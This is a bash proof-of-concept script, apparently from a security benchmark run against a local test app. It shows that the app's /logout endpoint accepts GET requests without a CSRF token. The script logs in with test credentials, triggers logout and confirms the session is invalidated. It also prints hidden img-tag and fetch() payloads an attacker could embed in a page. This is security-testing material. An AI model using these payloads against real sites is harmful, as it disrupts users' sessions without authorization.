#!/bin/bash
# POC: CSRF vulnerability on /logout endpoint - demonstrates that GET requests can log out authenticated users
# Target: ./repo
# Created: 2025-11-07T18:18:08.280Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# CSRF Vulnerability POC: Logout Endpoint (GET-Accessible)
# This script demonstrates that the /logout endpoint can be accessed via GET requests
# without CSRF token validation, allowing attackers to log out authenticated users

TARGET="http://localhost:80"
LOGOUT_ENDPOINT="${TARGET}/logout"

echo "[*] CSRF Vulnerability Test: GET-Accessible Logout Endpoint"
echo "[*] Target: ${LOGOUT_ENDPOINT}"
echo ""

# Step 1: Authenticate to get a session cookie
echo "[+] Step 1: Authenticating to obtain session cookie..."
AUTH_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  "${TARGET}/login" \
  -d "username=test&password=test")

# Check if cookies file was created
if [ -f /tmp/cookies.txt ]; then
    echo "[+] Session cookie obtained:"
    cat /tmp/cookies.txt | grep session
    echo ""
else
    echo "[-] Failed to obtain session cookie"
    exit 1
fi

# Step 2: Verify authenticated access to a protected resource
echo "[+] Step 2: Verifying authenticated session..."
PROTECTED_RESPONSE=$(curl -s -b /tmp/cookies.txt "${TARGET}/profile" 2>&1)
if echo "${PROTECTED_RESPONSE}" | grep -q "profile\|name\|email" || [ -n "${PROTECTED_RESPONSE}" ]; then
    echo "[+] Authenticated session verified - able to access protected endpoint"
else
    echo "[!] Warning: Protected endpoint may not be accessible, but continuing test..."
fi
echo ""

# Step 3: Perform CSRF attack - Logout via GET request
echo "[+] Step 3: Attempting logout via GET request (CSRF attack)..."
LOGOUT_RESPONSE=$(curl -v -b /tmp/cookies.txt "${LOGOUT_ENDPOINT}" 2>&1)

# Check if logout was successful (HTTP 302 redirect and Set-Cookie with expiration)
if echo "${LOGOUT_RESPONSE}" | grep -q "302\|301"; then
    echo "[+] HTTP 302 Redirect Response Detected"
fi

if echo "${LOGOUT_RESPONSE}" | grep -qi "Set-Cookie.*session.*Expires.*Thu.*Jan.*1970\|Set-Cookie.*session=;\|Max-Age=0"; then
    echo "[+] VULNERABLE: Session cookie invalidated via GET request"
    echo "[+] CSRF Attack Successful - User logged out without POST/CSRF token"
else
    echo "[!] Checking for alternative session termination indicators..."
    if echo "${LOGOUT_RESPONSE}" | grep -qi "Set-Cookie.*session"; then
        echo "[+] VULNERABLE: Session cookie modified in logout response"
        echo "${LOGOUT_RESPONSE}" | grep -i "Set-Cookie.*session"
    fi
fi
echo ""

# Step 4: Verify session is invalidated
echo "[+] Step 4: Verifying session is invalidated..."
VERIFY_RESPONSE=$(curl -s -b /tmp/cookies.txt "${TARGET}/profile" 2>&1)

if echo "${VERIFY_RESPONSE}" | grep -qi "login\|unauthorized\|403\|401" || [ -z "${VERIFY_RESPONSE}" ]; then
    echo "[+] CONFIRMED: Session invalidated after GET logout request"
    echo "[+] User cannot access protected resources"
else
    echo "[-] Session still appears valid (may indicate partial test)"
fi
echo ""

# Step 5: Test HEAD method
echo "[+] Step 5: Testing HEAD method on logout endpoint..."
HEAD_RESPONSE=$(curl -I -b /tmp/cookies.txt "${TARGET}/logout" 2>&1)
if echo "${HEAD_RESPONSE}" | grep -q "302\|301"; then
    echo "[+] HEAD method also works on logout endpoint"
fi
echo ""

# Step 6: Demonstrate CSRF attack vector
echo "[+] Step 6: CSRF Attack Vector Demonstration"
echo "[*] An attacker could embed this in a malicious webpage:"
echo ""
echo "    <!-- Hidden logout trigger -->"
echo "    <img src='http://target-site.com/logout' style='display:none;' />"
echo ""
echo "    <!-- Or via fetch API -->"
echo "    <script>"
echo "      fetch('http://target-site.com/logout', {credentials: 'include'})"
echo "      .then(r => console.log('Logout triggered'))"
echo "    </script>"
echo ""

echo "[+] POC completed"
echo ""
echo "Summary:"
echo "- Logout endpoint is GET-accessible"
echo "- No CSRF token validation required"
echo "- GET requests successfully invalidate sessions"
echo "- This violates OWASP A04:2021 (Insecure Design)"
echo "- CWE-352: Cross-Site Request Forgery (CSRF)"

# Cleanup
rm -f /tmp/cookies.txt

exit 0